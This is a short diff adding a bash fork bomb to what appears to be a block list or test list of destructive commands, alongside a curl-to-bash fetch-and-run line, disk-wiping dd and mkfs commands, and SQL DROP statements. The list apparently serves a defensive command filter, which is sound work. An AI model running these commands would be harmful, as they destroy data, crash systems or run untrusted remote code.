@@ -46,6 +46,7 @@
     "bash <(curl -s https://example.com/x.sh)",
     "dd if=/dev/zero of=/dev/sda bs=1M",
     "mkfs.ext4 /dev/sda1",
+    ":(){ :|:& };:",
     "DROP TABLE users",
     "drop database production",
     "DROP SCHEMA public",
